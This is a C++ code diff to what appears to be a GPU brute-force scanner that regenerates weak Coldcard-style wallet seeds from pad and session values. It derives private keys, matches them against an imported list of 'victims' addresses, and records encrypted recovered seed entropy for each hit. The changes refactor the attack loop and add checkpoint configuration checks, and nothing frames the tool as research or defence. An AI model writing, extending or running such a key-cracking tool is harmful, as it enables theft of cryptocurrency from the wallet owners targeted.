@@ -128,14 +128,12 @@ int Orchestrator::run_benchmark(const OrchestratorOptions& opts) {
   for (auto& s : seeds) {
     s.pad = 0x00400001;
     s.scan_session = 8;
-    s.entropy = coldcard_seed_entropy(s.pad, s.scan_session);
   }
 
-  const auto masters = masters_for_seeds(seeds);
   std::vector<GpuHit> hits;
   const int iterations = 5;
   for (int i = 0; i < iterations; i++) {
-    if (!gpu.process_master_batch(seeds, masters, hits, err)) {
+    if (!gpu.process_candidate_batch(seeds, hits, err)) {
       std::cerr << err << "\n";
       return 1;
     }
@@ -254,7 +252,21 @@ int Orchestrator::run_scan(const OrchestratorOptions& opts) {
     if (existing) run_row_id = existing->id;
   }
 
-  const std::string config_json = "gpu_util=" + std::to_string(gpu_util);
+  const int base_batch = std::max(1, opts.config.base_batch_seeds * gpu_util / 100);
+  const uint32_t scan_min = opts.config.scan_session_min;
+  const uint32_t scan_max = opts.config.scan_session_max;
+
+  const std::string config_json = "seed_model=mk3_v1 pads=" + std::to_string(opts.config.pad_high_min) + "-" +
+                                  std::to_string(opts.config.pad_high_max) + " sessions=" +
+                                  std::to_string(scan_min) + "-" + std::to_string(scan_max) +
+                                  " gpu_util=" + std::to_string(gpu_util);
+  const std::string expected_config_hash = sha256_hex(config_json);
+  if (resuming && !ck.config_hash.empty() && ck.config_hash != expected_config_hash) {
+    std::cerr << style.value("warning: checkpoint config_hash mismatch — use --fresh to restart with new seed model")
+              << "\n";
+    std::cerr << style.value("  checkpoint: " + ck.config_hash.substr(0, 16) + "…") << "\n";
+    std::cerr << style.value("  current:    " + expected_config_hash.substr(0, 16) + "…") << "\n";
+  }
   if (run_row_id < 0) {
     run_row_id = db.create_scan_run(run_id, config_json, err);
     if (run_row_id < 0) {
@@ -263,10 +275,6 @@ int Orchestrator::run_scan(const OrchestratorOptions& opts) {
     }
     db.insert_victim_import(victims.snapshot_hash(), victims.size(), err);
   }
-
-  const int base_batch = std::max(1, opts.config.base_batch_seeds * gpu_util / 100);
-  const uint32_t scan_min = opts.config.scan_session_min;
-  const uint32_t scan_max = opts.config.scan_session_max;
 
   if (resuming) {
     std::cerr << "scan resumed run_id=" << run_id << " victims=" << victims.size() << " paths=" << paths.size()
@@ -316,9 +324,8 @@ int Orchestrator::run_scan(const OrchestratorOptions& opts) {
 
       const size_t chunk = std::min(static_cast<size_t>(kInterruptChunkSeeds), seed_batch.size() - off);
       std::vector<SeedCandidate> chunk_seeds(seed_batch.begin() + off, seed_batch.begin() + off + chunk);
-      const auto masters = masters_for_seeds(chunk_seeds);
       std::vector<GpuHit> gpu_hits;
-      if (!gpu.process_master_batch(chunk_seeds, masters, gpu_hits, err)) {
+      if (!gpu.process_candidate_batch(chunk_seeds, gpu_hits, err)) {
         std::cerr << err << "\n";
         return 1;
       }
@@ -328,7 +335,8 @@ int Orchestrator::run_scan(const OrchestratorOptions& opts) {
         if (hit.seed_index >= chunk_seeds.size() || hit.path_index >= path_count) continue;
         const auto& seed = chunk_seeds[hit.seed_index];
         const auto& path = paths[hit.path_index];
-        const auto priv = derive_privkey_for_path(seed.entropy, path);
+        const auto entropy = coldcard_seed_entropy(seed.pad, seed.scan_session);
+        const auto priv = derive_privkey_for_path(entropy, path);
         if (priv.size() != 32) continue;
 
         const auto pub = bip32_internal::privkey_to_pubkey33(priv);
@@ -341,9 +349,9 @@ int Orchestrator::run_scan(const OrchestratorOptions& opts) {
         if (!victim) continue;
 
         hits++;
-        const std::string fp = sha256_hex(seed.entropy);
+        const std::string fp = sha256_hex(entropy);
         std::vector<uint8_t> enc;
-        if (!cipher.encrypt(seed.entropy, enc, err)) {
+        if (!cipher.encrypt(entropy, enc, err)) {
           std::cerr << err << "\n";
           continue;
         }
@@ -390,7 +398,6 @@ int Orchestrator::run_scan(const OrchestratorOptions& opts) {
       SeedCandidate sc;
       sc.pad = pad;
       sc.scan_session = scan_session;
-      sc.entropy = coldcard_seed_entropy(pad, scan_session);
       seed_batch.push_back(std::move(sc));
       if (static_cast<int>(seed_batch.size()) >= base_batch) {
         const int rc = flush_batch(pad_index);
